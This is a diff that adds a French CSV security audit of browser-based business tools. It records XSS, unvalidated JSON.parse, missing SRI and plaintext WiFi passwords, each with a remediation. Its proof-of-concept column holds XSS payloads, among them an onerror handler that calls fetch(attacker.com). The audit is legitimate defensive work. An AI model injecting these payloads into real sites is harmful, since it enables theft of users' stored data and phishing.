@@ -1,0 +1,29 @@
+Fichier,Ligne,Type Vulnérabilité,Sévérité,Nature du problème,POC / Données à risque,Impact,Recommandation
+/tools/landing-page.html,372,XSS via innerHTML,CRITIQUE,"innerHTML avec recommandations.map() non échappées",HTML brut contenant <img src=x onerror=...>,Vol de cookies localStorage + redirection malveillante,Utiliser DOMPurify ou textContent
+/tools/time/kanban-board.html,365,XSS via innerHTML,CRITIQUE,"${task.title} et ${task.description} non échappés",<img src=x onerror="fetch(attacker.com)"> dans titre/description,Accès aux données stockées en localStorage,Échapper avec escapeHtml()
+/tools/time/kanban-board.html,311,JSON.parse sans validation,MOYENNE-HAUTE,localStorage.getItem() sans try/catch,Corruption localStorage → crash page,Déni de service,Ajouter try/catch autour de JSON.parse
+/tools/invoicing/invoice-generator.html,276,XSS via innerHTML,CRITIQUE,"${invoiceData.invoice.number} ${invoiceData.company.name} non échappés",FACT-2025-<script>alert('XSS')</script>,Factures tampérées + phishing,Utiliser textContent pour les données simples
+/tools/invoicing/invoice-generator.html,279-294,XSS via innerHTML,CRITIQUE,"${invoiceData.company.address} ${invoiceData.client.email} non échappés",Injection HTML/JS dans adresse email,Phishing via documents générés,Implémenter sanitization
+/tools/invoicing/invoice-generator.html,319,XSS via innerHTML,CRITIQUE,"${line.description} dans tableau ligne 319",Description produit avec balises HTML,Factures malveillantes,Escaper les données
+/tools/inventory/delivery-tracker.html,180,XSS via innerHTML,CRITIQUE,"${d.orderNumber} ${d.supplier} non échappés",N° commande: "><img src=x onerror=...>,Compromission données logistiques,DOMPurify ou textContent
+/tools/inventory/label-generator.html,118,XSS via innerHTML,CRITIQUE,"productName sku category barcode non échappés",Nom produit: <img src=x onerror="alert('XSS')"/>,Étiquettes malveillantes,Échapper avant innerHTML
+/tools/inventory/label-generator.html,127,Injection via document.write(),CRITIQUE,"printContent contient du HTML/JS potentiellement malveillant",Injection XSS via document.write sans sanitization,XSS dans fenêtre d'impression,Remplacer par createElement + textContent
+/tools/hr/contract-generator.html,167,XSS via innerHTML,CRITIQUE,"${companyName} ${employeeName} ${position} ${location} non échappés",Contrats tampérés avec employeeeName: <img src=x>,Fraude documentaire + personnelle,Implémenter sanitization complète
+/tools/invoicing/accounting-dashboard.html,240,localStorage données sensibles,MOYENNE,"Stockage montants financiers en clair",localStorage lisible via DevTools ou XSS,Vol de données financières sensibles,Utiliser serveur ou chiffrer
+/tools/invoicing/payment-tracker.html,200,XSS via innerHTML,CRITIQUE,"${payment.status} données de paiement non échappées",Injection dans statut paiement,Compromission données de paiement,DOMPurify
+/tools/invoicing/expense-tracker.html,278,XSS via innerHTML,CRITIQUE,"${expense.category} ${expense.description} montants",Injection HTML dans description dépense,Données financières compromises,Sanitization
+/tools/marketing/qr-generator.html,360,Données sensibles en clair,CRITIQUE,"Mots de passe WiFi en clair dans QR code",WIFI:T:WPA;S:MonSSID;P:MotDePass;,Compromission réseau WiFi visible,Avertir utilisateur + chiffrer
+/tools/analytics/growth-calculator.html,124,XSS via innerHTML,HAUTE,"${calc} résultats non échappés",Injection HTML dans résultats calcul,Compromission données analytiques,textContent
+/tools/analytics/trend-predictor.html,168,XSS via innerHTML,HAUTE,"${forecastHtml} non échappé",HTML brut injecté,Prédictions tampérées,DOMPurify
+/tools/analytics/trend-predictor.html,191,XSS via innerHTML,HAUTE,"${analysisPoints} avec analyse.map()",Injection dans points d'analyse,Analyses fausses,Sanitization
+/tools/finance/loan-calculator.html,340,XSS via innerHTML,HAUTE,"Tableau d'amortissement non échappé",Montants injectés en HTML,Calculs falsifiés,textContent
+/tools/time/task-planner.html,375,XSS via innerHTML,CRITIQUE,"${task.title} ${task.description}",Tâches avec XSS payload,Données projet compromises,escapeHtml()
+/tools/misc/crm-dashboard.html,133,XSS via innerHTML,HAUTE,"${pipelineHTML} contenu brut",HTML non contrôlé,Pipeline CRM tamperée,DOMPurify
+/tools/inventory/delivery-tracker.html,103,JSON.parse sans validation,MOYENNE-HAUTE,Pas de try/catch,localStorage.getItem('deliveries') → crash,Déni de service + crash app,try/catch + validation
+/tools/time/timesheet.html,358,JSON.parse sans validation,MOYENNE-HAUTE,Pas de try/catch,localStorage.getItem('timesheets'),App crash si corruption,try/catch
+/tools/time/team-schedule.html,608,JSON.parse sans validation,MOYENNE-HAUTE,Pas de try/catch,localStorage.getItem('teamMembers'),Crash application,try/catch + validation
+/tools/invoicing/expense-tracker.html,216,JSON.parse sans validation,MOYENNE-HAUTE,Pas de try/catch,localStorage.getItem('expenses'),Déni de service,try/catch
+index.html,15,CDN sans SRI,MOYENNE,"Font Awesome CDN sans integrity",https://cdnjs.cloudflare.com/.../font-awesome/6.4.0/...,MitM peut injecter code malveillant,Ajouter integrity + crossorigin
+index.html,20,CDN sans SRI,MOYENNE,"Google Fonts sans integrity ni crossorigin",https://fonts.googleapis.com/css2?,MitM injection,Ajouter integrity + crossorigin
+tools/*/*.html,Multiple,CDN sans SRI,MOYENNE,"Chart.js jsdelivr sans integrity",https://cdn.jsdelivr.net/npm/chart.js,MitM attack,Ajouter SRI
+tools/*/*.html,Multiple,CDN sans SRI,MOYENNE,"Tous les CDN 200+ fois",HTTPS utilisé mais pas d'intégrité,MitM compromise de dépendances,Générer et ajouter hashes SRI
